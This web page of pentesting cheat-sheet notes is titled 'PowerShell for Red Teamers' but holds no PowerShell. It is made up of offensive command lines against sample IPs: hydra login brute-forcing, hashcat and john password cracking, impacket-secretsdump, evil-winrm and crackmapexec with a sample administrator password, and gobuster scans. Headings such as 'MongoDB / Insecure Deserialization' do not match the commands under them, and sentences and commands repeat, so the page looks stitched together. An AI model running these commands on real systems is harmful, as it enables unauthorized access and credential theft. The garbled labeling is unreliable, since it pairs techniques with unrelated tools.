---
TitleSEO: "PowerShell for Red Teamers | ZureFX"
TitlePost: "PowerShell for Red Teamers"
Author: "ZureFX"
Description: "Personal notes on PowerShell for Red Teamers. Quick reference for pentesting and CTF challenges."
Keywords: "malware, dfir, cheatsheet, windows, blue team, oscp"
URL: "https://zurefx.github.io/notes/note-powershell-for-red-teamers-430.html"
URL_IMAGES: ""
Date: "2025-03-21"
Tags: "Malware, DFIR, Cheatsheet, Windows, Blue Team, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-powershell-for-red-teamers-430"
Permalink: "/notes/note-powershell-for-red-teamers-430.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Resource-Based Constrained Delegation

### GetUserSPNs

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.31.176 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.94.212.129
```

```bash
evil-winrm -i 10.36.105.198 -u administrator -p 'P@ssw0rd!'
```

## MongoDB

### Insecure Deserialization

```bash
crackmapexec smb 10.36.220.67 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.24.12.242 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.244.177 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

```bash
gobuster dir -u http://10.79.148.112/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.80.115.20/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

- `burpsuite`
- `Unconstrained Delegation`
- `SeDebugPrivilege`

## LDAP

### secretsdump

- `LXD Privilege Escalation`
- `enum4linux`
- `Weak Service Permissions`
- `atexec`
- `msfvenom`

```bash
feroxbuster -h
gobuster dir -u http://10.40.157.165/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

- `Writable PATH`
- `pwncat`
- `IDOR`

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.
